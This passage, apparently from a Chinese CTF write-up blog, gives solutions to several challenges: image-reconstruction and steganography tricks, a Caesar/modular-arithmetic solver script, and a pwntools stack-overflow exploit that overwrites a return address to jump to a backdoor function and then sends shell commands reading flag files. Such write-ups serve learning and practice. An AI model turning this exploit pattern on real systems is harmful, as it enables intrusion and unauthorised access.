result_norm.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Try 1600x900</span></span><br><span class="line">width = <span class="number">1600</span></span><br><span class="line">height = <span class="number">900</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Generating <span class="subst">&#123;width&#125;</span>x<span class="subst">&#123;height&#125;</span> image&quot;</span>)</span><br><span class="line"></span><br><span class="line">out_img_1600 = Image.new(<span class="string">&quot;L&quot;</span>, (width, height))</span><br><span class="line">out_img_1600.putdata(pixels)</span><br><span class="line">out_img_1600.save(<span class="string">&quot;result_1600x900.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalize</span></span><br><span class="line">normalized_pixels = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> pixels:</span><br><span class="line">    norm_p = <span class="built_in">int</span>((p - min_val) / (max_val - min_val) * <span class="number">255</span>)</span><br><span class="line">    normalized_pixels.append(norm_p)</span><br><span class="line"></span><br><span class="line">out_img_1600_norm = Image.new(<span class="string">&quot;L&quot;</span>, (width, height))</span><br><span class="line">out_img_1600_norm.putdata(normalized_pixels)</span><br><span class="line">out_img_1600_norm.save(<span class="string">&quot;result_1600x900_norm.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Saved result_1600x900_norm.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply Gamma Correction to brighten the image</span></span><br><span class="line">gamma = <span class="number">0.4</span>  <span class="comment"># Value &lt; 1.0 brightens the image</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Applying Gamma Correction (gamma=<span class="subst">&#123;gamma&#125;</span>)&quot;</span>)</span><br><span class="line">gamma_pixels = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> pixels:</span><br><span class="line">    <span class="comment"># Normalize to 0-1 first</span></span><br><span class="line">    norm = (p - min_val) / (max_val - min_val)</span><br><span class="line">    <span class="comment"># Apply gamma</span></span><br><span class="line">    corrected = math.<span class="built_in">pow</span>(norm, gamma)</span><br><span class="line">    <span class="comment"># Scale back to 0-255</span></span><br><span class="line">    gamma_pixels.append(<span class="built_in">int</span>(corrected * <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">out_img_gamma = Image.new(<span class="string">&quot;L&quot;</span>, (width, height))</span><br><span class="line">out_img_gamma.putdata(gamma_pixels)</span><br><span class="line">out_img_gamma.save(<span class="string">&quot;result_gamma.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Saved result_gamma.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply Histogram Equalization (Rank-based mapping)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Applying Histogram Equalization&quot;</span>)</span><br><span class="line"><span class="comment"># Sort unique brightness values</span></span><br><span class="line">sorted_unique_brightness = <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(brightness_values)))</span><br><span class="line"><span class="comment"># Map each brightness value to a rank (0-255)</span></span><br><span class="line">brightness_rank = &#123;val: <span class="built_in">int</span>(i * <span class="number">255</span> / (<span class="built_in">len</span>(sorted_unique_brightness) - <span class="number">1</span>)) </span><br><span class="line">                   <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(sorted_unique_brightness)&#125;</span><br><span class="line"></span><br><span class="line">equalized_pixels = [brightness_rank[p] <span class="keyword">for</span> p <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">out_img_eq = Image.new(<span class="string">&quot;L&quot;</span>, (width, height))</span><br><span class="line">out_img_eq.putdata(equalized_pixels)</span><br><span class="line">out_img_eq.save(<span class="string">&quot;result_equalized.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Saved result_equalized.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121210030186.png"></p><p>解出来大概的轮廓，大概能瞪出来</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121210135162.png"></p><h3 id="misc-4ak5ra"><a href="#misc-4ak5ra" class="headerlink" title="misc-4ak5ra"></a>misc-4ak5ra</h3><p>使用010打开图片，发现图片尾包含一个zip</p><p>提取出来解压</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121202535846.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121202700514.png"></p><p>lsb隐写</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121202846443.png"></p><h3 id="MISC-问卷"><a href="#MISC-问卷" class="headerlink" title="MISC-问卷"></a>MISC-问卷</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121210530803.png"></p><h3 id="misc-monitoring"><a href="#misc-monitoring" class="headerlink" title="misc-monitoring"></a>misc-monitoring</h3><p>手绘大法</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251118184149488.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251118184133823.png"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn-Mission-Cipher-Text"><a href="#pwn-Mission-Cipher-Text" class="headerlink" title="pwn-Mission Cipher Text"></a>pwn-Mission Cipher Text</h3><p>ida-mcp加ai</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112210135381.png"></p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标信息</span></span><br><span class="line">HOST = <span class="string">&#x27;geek.ctfplus.cn&#x27;</span></span><br><span class="line">PORT = <span class="number">31936</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞分析：</span></span><br><span class="line"><span class="comment"># 1. submit_feedback() 函数中存在栈溢出漏洞</span></span><br><span class="line"><span class="comment">#    - buf 大小为 32 字节</span></span><br><span class="line"><span class="comment">#    - read(0, buf, 0x100) 读取 256 字节，明显溢出</span></span><br><span class="line"><span class="comment"># 2. 存在后门函数 b4ckd00r @ 0x4014ab，可以直接获取 shell</span></span><br><span class="line"><span class="comment"># 3. 程序关闭了 stdout (close(1))，但保留了 stderr</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务器</span></span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收菜单</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice &gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择选项 2：提交反馈 (submit_feedback)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收提示</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please enter your feedback:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line"><span class="comment"># 栈布局：</span></span><br><span class="line"><span class="comment"># [buf: 32 bytes][rbp: 8 bytes][ret: 8 bytes]</span></span><br><span class="line">backdoor_addr = <span class="number">0x4014ab</span></span><br><span class="line">ret_gadget = <span class="number">0x40101a</span>  <span class="comment"># ret gadget 用于栈对齐</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span>  <span class="comment"># 填充 buf</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span>  <span class="comment"># 覆盖 rbp</span></span><br><span class="line">payload += p64(ret_gadget)  <span class="comment"># 先返回到 ret gadget 进行栈对齐</span></span><br><span class="line">payload += p64(backdoor_addr)  <span class="comment"># 然后跳转到 b4ckd00r</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Backdoor address: <span class="subst">&#123;<span class="built_in">hex</span>(backdoor_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待 shell</span></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 shell 后执行命令</span></span><br><span class="line">log.success(<span class="string">&quot;Get shell! Searching for flag...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为 stdout 被关闭，我们需要将输出重定向到 stderr (文件描述符 2)</span></span><br><span class="line"><span class="comment"># 或者直接读取文件内容并通过其他方式输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试读取 flag - 使用 stderr 输出</span></span><br><span class="line">commands = [</span><br><span class="line">    <span class="string">b&#x27;cat flag 1&gt;&amp;2&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;cat /flag 1&gt;&amp;2&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;cat flag.txt 1&gt;&amp;2&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;ls -la 1&gt;&amp;2&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;cat /home/*/flag 1&gt;&amp;2&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> commands:</span><br><span class="line">    log.info(<span class="string">f&quot;Trying command: <span class="subst">&#123;cmd.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    io.sendline(cmd)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="pwn-Mission-Calculator"><a href="#pwn-Mission-Calculator" class="headerlink" title="pwn-Mission Calculator"></a>pwn-Mission Calculator</h3><p>AI+MCP</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">31003</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Press any key to start...&#x27;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">    p.recvuntil(<span class="string">f&#x27;Problem <span class="subst">&#123;i&#125;</span>: &#x27;</span>.encode())</span><br><span class="line">    line = p.recvuntil(<span class="string">b&#x27; = &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    nums = line.split(<span class="string">b&#x27; * &#x27;</span>)</span><br><span class="line">    num1 = <span class="built_in">int</span>(nums[<span class="number">0</span>])</span><br><span class="line">    num2 = <span class="built_in">int</span>(nums[<span class="number">1</span>])</span><br><span class="line">    result = num1 * num2</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(result).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111211217620.png"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="crypto-ez-xor"><a href="#crypto-ez-xor" class="headerlink" title="crypto-ez_xor"></a>crypto-ez_xor</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121203522867.png"></p><h3 id="crypto-Caesar-Slot-Machine"><a href="#crypto-Caesar-Slot-Machine" class="headerlink" title="crypto-Caesar Slot Machine"></a>crypto-Caesar Slot Machine</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121203842950.png"></p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit_parse_any_fixed3.py</span></span><br><span class="line"><span class="comment"># usage: python3 exploit_parse_any_fixed3.py [host] [port]</span></span><br><span class="line"><span class="comment"># fixed: handle shift=0 (raw plaintext flag), robust parsing, verbose</span></span><br><span class="line"><span class="comment"># Requires: pwntools</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">import</span> sys, re, binascii</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">DEFAULT_HOST = <span class="string">&quot;geek.ctfplus.cn&quot;</span></span><br><span class="line">DEFAULT_PORT = <span class="number">32528</span></span><br><span class="line">P_DEFAULT = <span class="number">1000000007</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">now</span>(): <span class="keyword">return</span> datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">text: <span class="built_in">str</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> shift == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= ch &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            res.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - base - shift) % <span class="number">26</span> + base))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= ch &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            res.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - base - shift) % <span class="number">26</span> + base))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(ch)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_best_plaintext</span>(<span class="params">cipher_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Try shifts 0..25. If raw decoded already contains Flag/SYC return it immediately.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = cipher_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(cipher_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If raw data already contains flag-like text, return it (shift=0)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Flag:&quot;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&quot;SYC&#123;&quot;</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, s), [(<span class="number">0</span>, s)]</span><br><span class="line"></span><br><span class="line">    candidates = []</span><br><span class="line">    best = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># include shift 0 .. 25</span></span><br><span class="line">    <span class="keyword">for</span> sh <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        plain = caesar_decrypt(s, sh)</span><br><span class="line">        candidates.append((sh, plain))</span><br><span class="line">        <span class="comment"># choose candidate that contains either PROVIDE or a line ending with &#x27;:&#x27; (prompt)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PROVIDE&quot;</span> <span class="keyword">in</span> plain <span class="keyword">or</span> re.search(<span class="string">r&quot;[A-Za-z]+:\s*$&quot;</span>, plain, re.M) <span class="keyword">or</span> re.search(<span class="string">r&quot;[A-Za-z]+:\s*\d+&quot;</span>, plain):</span><br><span class="line">            best = (sh, plain)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> best <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># fallback: choose candidate with most digits (heuristic)</span></span><br><span class="line">        scored = []</span><br><span class="line">        <span class="keyword">for</span> sh, plain <span class="keyword">in</span> candidates:</span><br><span class="line">            score = <span class="built_in">len</span>(re.findall(<span class="string">r&quot;\d+&quot;</span>, plain))</span><br><span class="line">            scored.append((score, sh, plain))</span><br><span class="line">        scored.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        best = (scored[<span class="number">0</span>][<span class="number">1</span>], scored[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> best, candidates</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_three_ints</span>(<span class="params">plain: <span class="built_in">str</span></span>):</span><br><span class="line">    ints = re.findall(<span class="string">r&quot;\d+&quot;</span>, plain)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ints) &gt;= <span class="number">3</span>:</span><br><span class="line">        a = <span class="built_in">int</span>(ints[<span class="number">0</span>])</span><br><span class="line">        b = <span class="built_in">int</span>(ints[<span class="number">1</span>])</span><br><span class="line">        p = <span class="built_in">int</span>(ints[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">return</span> a, b, p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_fixed_point</span>(<span class="params">a, b, p</span>):</span><br><span class="line">    <span class="keyword">if</span> (a - <span class="number">1</span>) % p == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b % p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>, <span class="string">&quot;a==1 and b==0 (any x works -&gt; choose 0)&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>, <span class="string">&quot;a==1 and b!=0 (no fixed point) -&gt; fallback 0&quot;</span></span><br><span class="line">    inv = <span class="built_in">pow</span>(a - <span class="number">1</span>, p - <span class="number">2</span>, p)</span><br><span class="line">    x = (-b * inv) % p</span><br><span class="line">    <span class="keyword">return</span> x, <span class="string">f&quot;inv(a-1)=<span class="subst">&#123;inv&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pretty_hex</span>(<span class="params">bts, n=<span class="number">80</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> binascii.hexlify(bts[:n]).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span>(bts[:n])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = DEFAULT_HOST</span><br><span class="line">    port = DEFAULT_PORT</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Connecting to <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    r = remote(host, port, timeout=<span class="number">10</span>)</span><br><span class="line">    round_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            round_num += <span class="number">1</span></span><br><span class="line">            data = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="comment"># receive initial block (wait up to a few seconds)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = r.recv(timeout=<span class="number">6</span>, numb=<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">except</span> TypeError:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data = r.recv(timeout=<span class="number">6</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] recv fallback err: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                    data = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] recv timeout/err: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] No data received; remote closed or timed out.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[<span class="subst">&#123;now()&#125;</span>] ===== Round <span 